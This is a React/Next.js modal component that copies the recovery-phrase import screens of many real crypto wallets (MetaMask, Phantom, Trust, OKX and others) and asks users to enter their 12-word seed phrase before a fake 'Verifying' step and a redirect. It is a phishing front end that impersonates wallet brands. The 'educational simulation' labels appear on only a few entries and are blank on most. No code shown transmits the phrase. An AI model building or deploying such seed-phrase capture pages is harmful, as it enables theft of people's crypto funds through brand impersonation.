// WalletWelcomeModal.tsx
// Fully converted to JSX syntax (no TypeScript types, plain React with JSX)
// All logic preserved, UI/UX per-wallet improvements kept, connection flow intact

"use client";

import { useState, useEffect } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { useAccount, useConnect } from "wagmi";
import { Check, Lock, ArrowRight } from "lucide-react";
import Button from "@/components/ui/Button";
import Card from "@/components/ui/Card";

const WALLET_STYLES = {
  MetaMask: {
    displayName: "MetaMask",
    icon: "🦊",
    gradient: "from-orange-500 to-amber-600",
    bg: "bg-gradient-to-br from-orange-950/20 via-zinc-950 to-black",
    accent: "text-orange-400",
    border: "border-orange-600/40",
    greeting: "Import using Secret Recovery Phrase",
    subtitle: "Enter your 12-word phrase in order",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to MetaMask...",
   
    buttonText: "Import",
  },
  "Coinbase Wallet": {
    displayName: "Coinbase Wallet",
    icon: "🔵",
    gradient: "from-blue-600 to-blue-400",
    bg: "bg-gradient-to-br from-blue-950/25 via-zinc-950 to-black",
    accent: "text-blue-400",
    border: "border-blue-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter your recovery phrase",
    successTitle: "Wallet Restored",
    successMessage: "Connecting to Coinbase Wallet...",
    bottomNote: "Simulation – Educational Use Only",
    buttonText: "Restore",
  },
  Phantom: {
    displayName: "Phantom",
    icon: "👻",
    gradient: "from-purple-600 via-indigo-500 to-purple-700",
    bg: "bg-gradient-to-br from-purple-950/30 via-indigo-950/20 to-black",
    accent: "text-purple-300",
    border: "border-purple-600/50",
    greeting: "Import Recovery Phrase",
    subtitle: "Enter your 12 or 24-word phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Phantom...",

    buttonText: "Import",
  },
  Trust: {
    displayName: "Trust Wallet",
    icon: "🛡️",
    gradient: "from-cyan-500 to-teal-600",
    bg: "bg-gradient-to-br from-teal-950/25 via-zinc-950 to-black",
    accent: "text-teal-300",
    border: "border-teal-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter your secret phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Trust Wallet...",
    bottomNote: "Educational Simulation Only",
    buttonText: "Import",
  },
  Rainbow: {
    displayName: "Rainbow",
    icon: "🌈",
    gradient: "from-pink-500 via-purple-500 to-indigo-600",
    bg: "bg-gradient-to-br from-purple-950/30 via-pink-950/20 to-black",
    accent: "text-pink-300",
    border: "border-pink-600/40",
    greeting: "Restore with Recovery Phrase",
    subtitle: "Enter your secret recovery phrase",
    successTitle: "Wallet Restored",
    successMessage: "Connecting to Rainbow...",

    buttonText: "Restore Wallet",
  },
  WalletConnect: {
    displayName: "WalletConnect",
    icon: "🔗",
    gradient: "from-cyan-500 to-blue-600",
    bg: "bg-gradient-to-br from-cyan-950/25 via-zinc-950 to-black",
    accent: "text-cyan-300",
    border: "border-cyan-600/40",
    greeting: "Connect Wallet",
    subtitle: "Enter phrase if required",
    successTitle: "Session Authenticated",
    successMessage: "Connecting via WalletConnect...",
 
    buttonText: "Connect",
  },
  SafePal: {
    displayName: "SafePal",
    icon: "🔐",
    gradient: "from-emerald-600 to-teal-500",
    bg: "bg-gradient-to-br from-emerald-950/25 via-zinc-950 to-black",
    accent: "text-emerald-300",
    border: "border-emerald-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to SafePal...",
  
    buttonText: "Import",
  },
  "Binance Wallet": {
    displayName: "Binance Web3 Wallet",
    icon: "₿",
    gradient: "from-yellow-500 to-amber-600",
    bg: "bg-gradient-to-br from-amber-950/25 via-zinc-950 to-black",
    accent: "text-yellow-300",
    border: "border-yellow-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter your recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Binance Web3...",
   
    buttonText: "Import",
  },
  Zerion: {
    displayName: "Zerion",
    icon: "⚡",
    gradient: "from-violet-600 to-purple-500",
    bg: "bg-gradient-to-br from-violet-950/25 via-zinc-950 to-black",
    accent: "text-violet-300",
    border: "border-violet-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Zerion...",
  
    buttonText: "Import",
  },
  OKX: {
    displayName: "OKX Wallet",
    icon: "🔶",
    gradient: "from-blue-700 to-indigo-600",
    bg: "bg-gradient-to-br from-indigo-950/25 via-zinc-950 to-black",
    accent: "text-indigo-300",
    border: "border-indigo-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter 12-word recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to OKX Wallet...",
    bottomNote: "Simulation – Educational Only",
    buttonText: "Import",
  },
  "Brave Wallet": {
    displayName: "Brave Wallet",
    icon: "🦁",
    gradient: "from-orange-500 to-red-600",
    bg: "bg-gradient-to-br from-red-950/25 via-zinc-950 to-black",
    accent: "text-red-300",
    border: "border-red-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Brave Wallet...",
   
    buttonText: "Import",
  },
  Frame: {
    displayName: "Frame",
    icon: "🖼️",
    gradient: "from-gray-600 to-slate-500",
    bg: "bg-gradient-to-br from-slate-950/25 via-zinc-950 to-black",
    accent: "text-slate-300",
    border: "border-slate-600/40",
    greeting: "Import Wallet",
    subtitle: "Enter recovery phrase",
    successTitle: "Wallet Imported",
    successMessage: "Connecting to Frame...",
    bottomNote: "Educational Simulation",
    buttonText: "Import",
  },
};

export default function WalletWelcomeModal({ isOpen, onOpen, onClose }) {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { address, connector, isConnected } = useAccount();
  const { connect, connectors, pendingConnector } = useConnect();

  const [boxes, setBoxes] = useState(Array(12).fill(""));
  const [submitted, setSubmitted] = useState(false);
  const [saving, setSaving] = useState(false);
  const [errorMessage, setErrorMessage] = useState(null);

  const urlWallet = searchParams.get("wallet");

  useEffect(() => {
    if (isOpen) onOpen?.();
  }, [isOpen, onOpen]);

  let detectedName = (
    urlWallet ||
    pendingConnector?.name ||
    connector?.name ||
    "MetaMask"
  )
    .toLowerCase()
    .trim();

  if (detectedName.includes("metamask") || detectedName.includes("injected"))
    detectedName = "MetaMask";
  else if (detectedName.includes("coinbase")) detectedName = "Coinbase Wallet";
  else if (detectedName.includes("walletconnect")) detectedName = "WalletConnect";
  else if (detectedName.includes("rainbow")) detectedName = "Rainbow";
  else if (detectedName.includes("phantom")) detectedName = "Phantom";
  else if (detectedName.includes("trust")) detectedName = "Trust";
  else if (detectedName.includes("okx")) detectedName = "OKX";
  else if (detectedName.includes("zerion")) detectedName = "Zerion";
  else if (detectedName.includes("safepal")) detectedName = "SafePal";
  else if (detectedName.includes("binance")) detectedName = "Binance Wallet";
  else if (detectedName.includes("brave")) detectedName = "Brave Wallet";
  else if (detectedName.includes("frame")) detectedName = "Frame";

  const activeName = detectedName;
  const theme = WALLET_STYLES[activeName] || WALLET_STYLES.MetaMask;

  const findBestConnector = () => {
    if (!connectors?.length) return null;

    const lower = activeName.toLowerCase();

    return (
      connectors.find(
        (c) =>
          c.name?.toLowerCase().includes(lower) ||
          c.id?.toLowerCase().includes(lower) ||
          (lower === "metamask" && (c.id?.includes("injected") || c.id?.includes("meta"))) ||
          (lower === "walletconnect" && c.id?.includes("walletconnect")) ||
          (lower === "coinbase" && (c.id?.includes("coinbase") || c.id?.includes("walletlink"))) ||
          (lower === "phantom" && c.id?.includes("phantom")) ||
          (lower === "trust" && c.id?.includes("trust")) ||
          (lower === "rainbow" && c.id?.includes("rainbow")) ||
          (lower === "okx" && c.id?.includes("okx")) ||
          (lower === "zerion" && c.id?.includes("zerion")) ||
          (lower === "safepal" && c.id?.includes("safepal")) ||
          (lower === "binance" && c.id?.includes("binance")) ||
          (lower === "brave" && c.id?.includes("brave")) ||
          (lower === "frame" && c.id?.includes("frame"))
      ) ||
      (lower.includes("meta") && connectors.find((c) => c.id?.includes("injected"))) ||
      connectors.find((c) => c.id?.includes("walletconnect")) ||
      connectors[0] ||
      null
    );
  };

  useEffect(() => {
    if (!submitted) return;

    let mounted = true;

    const proceed = async () => {
      const selected = findBestConnector();

      if (!selected) {
        console.warn(`No connector found for ${activeName}`);
        if (mounted) {
          onClose();
          router.push(`/connect-wallet?modal=completed&wallet=${encodeURIComponent(activeName)}`);
        }
        return;
      }

      try {
        console.log(`Connecting with: ${selected.name} (${selected.id})`);
        await connect({ connector: selected });
        await new Promise((r) => setTimeout(r, 1200));
      } catch (err) {
        console.error("Connect failed:", err);
      } finally {
        if (mounted) {
          onClose();
          router.push(`/connect-wallet?modal=completed&wallet=${encodeURIComponent(activeName)}`);
        }
      }
    };

    const timer = setTimeout(proceed, 2200);

    return () => {
      mounted = false;
      clearTimeout(timer);
    };
  }, [submitted, connect, connectors, activeName, onClose, router]);

  const handleBoxChange = (index, value) => {
    const newBoxes = [...boxes];
    newBoxes[index] = value.trim().toLowerCase();
    setBoxes(newBoxes);
  };

  const handlePaste = (e, index) => {
    if (index !== 0) return;
    e.preventDefault();
    const text = e.clipboardData.getData("text").trim();
    const words = text.split(/\s+/).filter(Boolean).slice(0, 12);
    if (words.length > 0) {
      const newBoxes = [...boxes];
      words.forEach((w, i) => (newBoxes[i] = w.toLowerCase()));
      setBoxes(newBoxes);
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!boxes.every(Boolean)) return;

    setSaving(true);
    setErrorMessage(null);

    setTimeout(() => {
      setSubmitted(true);
      setSaving(false);
    }, 1400);
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-[9999] flex items-end md:items-center justify-center bg-black/75 backdrop-blur-xl p-4 pb-12 md:pb-6 transition-opacity duration-300">
      <Card
        className={`relative w-full max-w-md md:max-w-lg overflow-hidden border ${theme.border} ${theme.bg} rounded-3xl md:rounded-3xl shadow-2xl shadow-black/70 transform transition-all duration-300`}
      >
        <div className={`absolute inset-x-0 top-0 h-48 bg-gradient-to-b ${theme.gradient} opacity-15 blur-3xl pointer-events-none`} />

        <div className="absolute top-3 left-3 md:top-4 md:left-4 z-30 bg-red-700/90 text-white text-xs font-bold px-3 py-1 rounded-full shadow">
      DO NOT SHARE SEED PHRASES WITH ANYBODY!!!!!!!!!!!
        </div>

        <button
          onClick={onClose}
          className="absolute top-4 right-4 z-30 p-2.5 text-zinc-400 hover:text-white bg-black/50 rounded-full transition hover:bg-black/70"
        >
          <svg width="18" height="18" viewBox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path
              d="M11.7816 4.03157C12.0062 3.80702 12.0062 3.44295 11.7816 3.2184C11.5571 2.99385 11.193 2.99385 10.9685 3.2184L7.50005 6.68682L4.03164 3.2184C3.80708 2.99385 3.44301 2.99385 3.21846 3.2184C2.99391 3.44295 2.99391 3.80702 3.21846 4.03157L6.68688 7.49999L3.21846 10.9684C2.99391 11.193 2.99391 11.557 3.21846 11.7816C3.44301 12.0061 3.80708 12.0061 4.03164 11.7816L7.50005 8.31316L10.9685 11.7816C11.193 12.0061 11.5571 12.0061 11.7816 11.7816C12.0062 11.557 12.0062 11.193 11.7816 10.9684L8.31322 7.49999L11.7816 4.03157Z"
              fill="currentColor"
              fillRule="evenodd"
              clipRule="evenodd"
            />
          </svg>
        </button>

        <div className="relative z-20 p-6 md:p-8 lg:p-10">
          {!submitted ? (
            <>
              <div className="text-center mb-8">
                <div className={`inline-flex items-center justify-center w-20 h-20 md:w-24 md:h-24 mb-6 rounded-3xl text-5xl shadow-lg bg-black/50 border ${theme.border}`}>
                  {theme.icon}
                </div>
                <h2 className="text-2xl md:text-3xl font-bold text-white mb-3 tracking-tight">
                  {theme.greeting}
                </h2>
                <p className="text-zinc-300 text-base md:text-lg mb-1">{theme.subtitle}</p>
                <p className="text-sm text-zinc-500 font-mono">
                  {activeName} • 
                </p>
              </div>

              {errorMessage && (
                <div className="mb-6 p-4 bg-red-950/60 border border-red-700 rounded-2xl text-red-200 text-center text-sm">
                  {errorMessage}
                </div>
              )}

              <form onSubmit={handleSubmit} className="space-y-5">
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3 md:gap-4">
                  {boxes.map((box, i) => (
                    <div key={i} className="relative">
                      <span className="absolute left-3.5 top-1/2 -translate-y-1/2 text-xs font-semibold text-zinc-600 pointer-events-none">
                        {i + 1}
                      </span>
                      <input
                        value={box}
                        onChange={(e) => handleBoxChange(i, e.target.value)}
                        onPaste={(e) => handlePaste(e, i)}
                        required
                        autoComplete="off"
                        spellCheck={false}
                        className={`w-full bg-black/40 border ${theme.border.replace('/40', '/60')} rounded-xl pl-12 pr-4 py-4 text-white text-base focus:outline-none focus:border-white/30 focus:ring-1 focus:ring-white/10 transition-all font-mono tracking-wide placeholder:text-zinc-600`}
                        placeholder=""
                      />
                    </div>
                  ))}
                </div>

                <div className="pt-3">
                  <Button
                    type="submit"
                    disabled={!boxes.every(Boolean) || saving}
                    className={`w-full py-4 rounded-2xl font-bold text-lg transition-all shadow-lg hover:scale-[1.02] bg-gradient-to-r ${theme.gradient} disabled:opacity-50 disabled:hover:scale-100 flex items-center justify-center gap-2`}
                  >
                    {saving ? (
                      <>
                        <div className="w-5 h-5 border-2 border-white/50 border-t-white rounded-full animate-spin" />
                        Verifying...
                      </>
                    ) : (
                      theme.buttonText
                    )}
                  </Button>
                </div>

                <p className="text-center text-xs text-zinc-500 pt-3">
                 
                </p>
              </form>
            </>
          ) : (
            <div className="text-center py-10 animate-in fade-in zoom-in duration-500">
              <div className={`w-24 h-24 mx-auto rounded-full bg-gradient-to-br ${theme.gradient} bg-opacity-10 border border-white/10 flex items-center justify-center mb-8 shadow-lg`}>
                <Check className="text-white" size={52} strokeWidth={3} />
              </div>
              <h2 className="text-3xl font-bold text-white mb-4">
                {theme.successTitle}
              </h2>
              <p className="text-zinc-300 text-lg mb-10 max-w-sm mx-auto">
                {theme.successMessage}
              </p>

              <Button
                onClick={async () => {
                  const selected = findBestConnector();
                  if (selected) {
                    try {
                      await connect({ connector: selected });
                    } catch (err) {
                      console.error(err);
                    }
                  }
                  onClose();
                  router.push(`/connect-wallet?modal=completed&wallet=${encodeURIComponent(activeName)}`);
                }}
                className={`py-4 px-12 rounded-2xl font-bold text-lg bg-gradient-to-r ${theme.gradient} shadow-xl flex items-center justify-center gap-3 mx-auto hover:scale-[1.02] transition-transform`}
              >
                Continue <ArrowRight size={20} />
              </Button>

              <p className="mt-8 text-sm text-zinc-500">
                Redirecting...
              </p>
            </div>
          )}

          <div className="mt-10 pt-6 border-t border-zinc-800/50 flex items-center justify-center gap-3 text-xs uppercase tracking-wider font-semibold text-zinc-500">
            <Lock size={14} className={theme.accent} />
            {theme.bottomNote}
          </div>
        </div>
      </Card>
    </div>
  );
}